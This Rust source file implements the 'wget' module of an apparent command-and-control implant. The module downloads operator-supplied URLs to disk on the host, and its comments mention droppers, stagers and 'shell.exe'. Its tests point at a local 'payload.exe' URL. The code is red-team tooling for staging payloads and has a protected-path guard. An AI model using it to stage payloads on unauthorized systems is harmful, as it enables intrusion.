//! Download a file from a URL — cross-platform via minreq.
//!
//! Streams the body to disk (capped at `MAX_WGET_BYTES`) so the agent does
//! not OOM on a runaway server, and so a 4 GiB dropper doesn't sit in RAM
//! before the first `write`. TLS verification is strict with the minreq
//! backend.

use std::path::Path;

use mythic::{Artifact, TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
use crate::sys::network::http_get_to_writer;

/// Hard cap on a single wget response. Larger transfers should use a
/// stager split into multiple wget calls. 256 MiB mirrors `upload`.
const MAX_WGET_BYTES: u64 = 256 * 1024 * 1024;

#[derive(Deserialize)]
struct Params {
    url: String,
    #[serde(default)]
    path: String,
    /// Optional override for the byte cap. Clamped to [1, MAX_WGET_BYTES].
    #[serde(default)]
    max_bytes: Option<u64>,
    /// When true, allows writing into protected system paths.
    #[serde(default)]
    allow_system_path: bool,
}

/// Extract a filename from a URL path, or fall back to "download".
fn filename_from_url(url: &str) -> String {
    let path = url.split('?').next().unwrap_or(url);
    let name = path.rsplit('/').next().unwrap_or("download");
    if name.is_empty() { "download" } else { name }.to_string()
}

fn temp_path_for(dest: &Path, task_id: uuid::Uuid) -> std::path::PathBuf {
    let mut name = dest
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "download".into());
    name.push_str(&format!(".nanaz-{task_id}.tmp"));
    dest.with_file_name(name)
}

fn replace_with_temp(temp: &Path, dest: &Path) -> Result<(), String> {
    if cfg!(windows) && dest.exists() {
        std::fs::remove_file(dest)
            .map_err(|e| format!("replace {} failed: {e}", display_path(dest)))?;
    }
    std::fs::rename(temp, dest).map_err(|e| {
        format!(
            "move {} to {} failed: {e}",
            display_path(temp),
            display_path(dest)
        )
    })
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("wget parse error: {e}")),
    };

    let cap = params
        .max_bytes
        .unwrap_or(MAX_WGET_BYTES)
        .clamp(1, MAX_WGET_BYTES);

    // 1. Determine destination path
    let dest = if params.path.is_empty() {
        let mut tmp = std::env::temp_dir();
        tmp.push(filename_from_url(&params.url));
        tmp
    } else {
        Path::new(&normalize_user_path(&params.path)).to_path_buf()
    };

    if !params.allow_system_path && is_protected_path(&display_path(&dest)) {
        return TaskResponse::failed(
            task.id,
            &format!(
                "refusing write to system path {}; set allow_system_path=true to override",
                display_path(&dest)
            ),
        );
    }

    // Create parent dirs
    if let Some(parent) = dest.parent()
        && !parent.as_os_str().is_empty()
        && let Err(e) = std::fs::create_dir_all(parent)
    {
        return TaskResponse::failed(
            task.id,
            &format!("create parent dir {} failed: {e}", display_path(parent)),
        );
    }

    // 2. Stream the body to disk. If the response fails midway, clean up
    //    the partial file so we don't leave a 0-byte artifact named
    //    "shell.exe" lying around.
    let temp_dest = temp_path_for(&dest, task.id);
    let file = match std::fs::File::create(&temp_dest) {
        Ok(f) => f,
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("create {} failed: {e}", display_path(&temp_dest)),
            );
        }
    };
    let mut writer = std::io::BufWriter::new(file);

    let result = http_get_to_writer(&params.url, None, None, cap, &mut writer);
    let n = match result {
        Ok(n) => n,
        Err(e) => {
            // Best-effort: remove the partial file.
            let _ = std::fs::remove_file(&temp_dest);
            return TaskResponse::failed(task.id, &format!("download {} failed: {e}", params.url));
        }
    };

    if let Err(e) = std::io::Write::flush(&mut writer) {
        let _ = std::fs::remove_file(&temp_dest);
        return TaskResponse::failed(
            task.id,
            &format!("flush {} failed: {e}", display_path(&dest)),
        );
    }
    drop(writer);

    if let Err(e) = replace_with_temp(&temp_dest, &dest) {
        let _ = std::fs::remove_file(&temp_dest);
        return TaskResponse::failed(task.id, &e);
    }

    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!(
            "downloaded {} -> {} ({} bytes)",
            params.url,
            display_path(&dest),
            n
        )),
        artifacts: vec![Artifact {
            base_artifact: "FileWrite".into(),
            artifact: display_path(&dest),
            needs_cleanup: true,
            resolved: true,
        }],
        ..Default::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wget_refuses_system_destination_before_network() {
        let task = TaskMessage {
            command: "wget".into(),
            parameters: serde_json::json!({
                "url": "http://127.0.0.1:1/payload.exe",
                "path": "/etc/nanaz_wget_test",
            })
            .to_string(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
        assert!(
            resp.user_output
                .unwrap_or_default()
                .contains("refusing write to system path")
        );
    }

    #[test]
    fn test_wget_failure_preserves_existing_file() {
        let dest = {
            let mut p = std::env::temp_dir();
            p.push(format!("nanaz_wget_existing_{}.bin", std::process::id()));
            p
        };
        std::fs::write(&dest, b"original").unwrap();
        let task = TaskMessage {
            id: uuid::Uuid::new_v4(),
            command: "wget".into(),
            parameters: serde_json::json!({
                "url": "http://127.0.0.1:1/payload.exe",
                "path": dest.to_string_lossy(),
            })
            .to_string(),
            ..Default::default()
        };

        let resp = handle(&task);

        assert_eq!(resp.status.as_deref(), Some("error"));
        assert_eq!(std::fs::read(&dest).unwrap(), b"original");
        let _ = std::fs::remove_file(dest);
    }
}
